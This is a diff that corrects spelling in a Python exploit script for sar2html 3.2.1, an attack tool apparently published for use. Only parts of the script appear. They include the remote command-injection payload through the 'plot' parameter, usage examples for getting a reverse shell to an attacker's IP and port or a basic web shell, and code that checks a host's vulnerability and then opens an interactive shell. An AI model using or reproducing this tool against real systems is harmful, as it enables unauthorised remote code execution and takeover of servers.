@@ -7,11 +7,11 @@
 # Software Link:  https://sourceforge.net/projects/sar2html/
 # Version: 3.2.1
 # Tested on: Debian 5.7.6
-# Default expliot: http://IP/index.php?plot=;ls
+# Default exploit: http://IP/index.php?plot=;ls
 
 # Usage: ./sar2HTML -ip HOST IP -rip IP:PORT -pe folder
-# Exmaples: #Usage: ./sar2HTML -ip 192.168.1.81 -rip 192.168.1.22:9999 -pe sar2HTML (Reverse Shell)
-# Exmaples: #Usage: ./sar2HTML -ip 192.168.1.81 -pe sar2HTML (Baisc Web Shell)
+# Examples: #Usage: ./sar2HTML -ip 192.168.1.81 -rip 192.168.1.22:9999 -pe sar2HTML (Reverse Shell)
+# Examples: #Usage: ./sar2HTML -ip 192.168.1.81 -pe sar2HTML (Basic Web Shell)
 
 import re
 import requests
@@ -102,9 +102,9 @@ def runShell(url):
             printResults(r.text)
 
 if checkHostIsVunerable(outURL):
-    print("The Host Appears Vunerable, Running a basic shell ...")
+    print("The Host Appears Vulnerable, Running a basic shell ...")
     print("Enter: '"+col.RED+"rs session"+col.RESET+"' for a ReverseShell")
     runShell(outURL)
 else:
-    print(col.RED + "Host NOT vunerable, Try a new path!!" + col.RESET)
+    print(col.RED + "Host NOT Vulnerable, Try a new path!!" + col.RESET)
     exit(0)
